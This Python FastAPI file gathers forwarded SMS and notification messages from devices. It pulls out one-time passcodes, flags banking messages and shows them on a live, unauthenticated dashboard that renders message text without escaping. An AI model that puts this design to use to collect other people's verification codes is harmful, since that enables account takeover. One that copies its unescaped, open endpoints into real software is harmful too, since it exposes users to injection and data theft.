from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
from typing import List, Optional
import time

app = FastAPI()

# In-memory storage for demonstration (In production, use a Database)
data_store = []

class ApiPayload(BaseModel):
    source_app: str
    title: str
    message: str
    is_otp: bool
    extracted_code: Optional[str] = None
    timestamp: int
    device_id: str

@app.post("/v1/incoming-data")
async def receive_data(payload: ApiPayload):
    # This is where your AI logic goes
    processed_data = payload.dict()
    processed_data["received_at"] = time.ctime()

    # Simple AI check: Flag high-priority keywords
    if "bank" in payload.message.lower() or "transaction" in payload.message.lower():
        processed_data["priority"] = "HIGH"
    else:
        processed_data["priority"] = "NORMAL"

    data_store.insert(0, processed_data) # Add to top of list
    return {"status": "success", "priority": processed_data.get("priority")}

@app.get("/", response_class=HTMLResponse)
async def dashboard(request: Request):
    html_content = """
    <html>
        <head>
            <title>SMS Forwarder Dashboard</title>
            <meta http-equiv="refresh" content="5">
            <style>
                body { font-family: sans-serif; background: #f4f4f9; padding: 20px; }
                .card { background: white; padding: 15px; margin-bottom: 10px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); border-left: 5px solid #00796b; }
                .otp { border-left: 5px solid #d32f2f; background: #fff5f5; }
                .header { color: #00796b; border-bottom: 2px solid #00796b; padding-bottom: 10px; }
                .meta { font-size: 0.8em; color: #666; }
                .code { font-weight: bold; color: #d32f2f; font-size: 1.2em; }
            </style>
        </head>
        <body>
            <h1 class="header">Live SMS & Notification Dashboard</h1>
            <div id="logs">
                {% for item in data %}
                <div class="card {{ 'otp' if item.is_otp else '' }}">
                    <strong>{{ item.source_app }}</strong> - {{ item.title }}
                    <p>{{ item.message }}</p>
                    {% if item.extracted_code %}
                    <p>Extracted Code: <span class="code">{{ item.extracted_code }}</span></p>
                    {% endif %}
                    <div class="meta">Device: {{ item.device_id }} | Time: {{ item.received_at }}</div>
                </div>
                {% endfor %}
            </div>
        </body>
    </html>
    """
    # Simple manual rendering since we don't have separate files
    from jinja2 import Template
    template = Template(html_content)
    return HTMLResponse(content=template.render(data=data_store))
